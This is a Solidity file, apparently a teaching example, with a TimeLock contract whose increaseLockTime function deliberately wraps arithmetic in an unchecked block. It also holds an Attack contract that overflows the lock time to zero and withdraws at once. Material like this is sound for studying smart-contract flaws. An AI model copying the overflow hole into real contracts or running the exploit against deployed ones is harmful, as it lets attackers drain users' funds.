// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        // In solidity version ^0.8 reverts on overflow and underflows.
        // using unchecked block does not revert if there is overflow or underflow.
        unchecked {
            lockTime[msg.sender] += _secondsToIncrease;
        }
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        uint value;
        unchecked {
            value = type(uint).max + 1 - timeLock.lockTime(address(this));
        }
        timeLock.increaseLockTime(value);
        timeLock.withdraw();
    }
}
